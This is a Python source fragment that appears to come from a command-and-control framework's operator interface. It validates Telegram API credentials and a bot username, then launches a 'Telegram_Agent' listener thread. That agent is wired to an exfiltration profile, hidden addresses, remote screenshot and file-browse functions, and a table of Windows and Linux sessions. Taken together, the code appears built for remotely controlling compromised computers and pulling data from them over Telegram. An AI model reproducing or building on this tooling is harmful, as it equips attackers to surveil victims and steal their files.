    def validate_telegram_inputs(self, api_id, api_hash, phone_number, listener_name, bot_username):
        if not api_id:
            return "API ID cannot be empty"
        try:
            api_id_int = int(api_id)
            if api_id_int <= 0:
                return "API ID must be a positive number"
        except ValueError:
            return "API ID must be a valid number"
        
        if not api_hash:
            return "API Hash cannot be empty"
        if len(api_hash) < 32:
            return "API Hash must be at least 32 characters"
        
        if not phone_number:
            return "Phone number cannot be empty"
        phone_number = phone_number.strip()
        if not phone_number.startswith('+'):
            return "Phone number must start with '+' (+1234567890)"
        if not phone_number[1:].isdigit():
            return "Phone number must contain only digits after '+'"
        if not listener_name:
            return "Listener Name cannot be empty"
        listener_name = listener_name.strip()
        if len(listener_name) < 2:
            return "Listener Name must be at least 2 characters"
        if len(listener_name) > 50:
            return "Listener Name cannot exceed 50 characters"
        if not listener_name.replace(" ", "").isalnum():
            return "Listener Name can only contain letters, numbers, and spaces"
        
        if not bot_username:
            return "Bot username cannot be empty"
        bot_username = bot_username.strip()
        if not bot_username.startswith('@'):
            return "Bot username must start with '@' (@example_bot)"
        if ' ' in bot_username:
            return "Bot username cannot contain spaces"
        if len(bot_username) < 5:
            return "Bot username is too short"
        if not (bot_username.endswith('bot') or bot_username.endswith('_bot')):
            return "Bot username should end with 'bot' or '_bot'"
        
        return None

    def save_and_connect(self):
        api_id = self.api_id_entry.get().strip()
        api_hash = self.api_hash_entry.get().strip()
        phone = self.phone_entry.get().strip()
        listener_name_entry = self.listener_name_entry.get().strip()
        bot = self.bot_entry.get().strip()
        window_agent = self.window_telegram

        error = self.validate_telegram_inputs(api_id, api_hash, phone, listener_name_entry, bot)
        if error:
            messagebox.showerror("Validation Error", error, parent=self.window_telegram)
            return
        
        can_connect, message = self.session_manager.can_connect(phone, window_agent)
        if not can_connect:
            return
        self.api_id = api_id
        self.api_hash = api_hash
        self.phone_number = phone
        self.your_username = bot
        exfiltration_profile = self.exfiltration_profile_var.get()
        hidden_addresses = self.hidden_addresses
        listener_uuid = str(uuid.uuid4())
        values = [listener_name_entry, f"Telegram Bot", "MTProto 2.0", "AES-256 - RSA-2048", "Telegram Agent", "Active", self.api_id, self.api_hash, self.phone_number, self.your_username]

        if not hasattr(self, "saved_sessions"):
            self.saved_sessions = []
        self.saved_sessions.append(values)

        try:
            self.session_table_listener.insert("", "end", values=values)
        except Exception:
            pass

        server = Telegram_Agent(self.center_window, self.create_context_menu, self.save_screenshot_window, self.open_file_browse_window, self.save_file_from_browse, exfiltration_profile, hidden_addresses, self.update_output_text, self.add_session, listener_uuid, self.windows_os_icon, self.linux_os_icon, self.session_table, self.api_id, self.api_hash, self.phone_number, self.your_username, self.session_manager)
        self.telegram_agents.append(server)
        self.running_server_instances[listener_uuid] = server
        threading.Thread(target=server.start_connection, daemon=True).start()
        self.window_telegram.destroy()


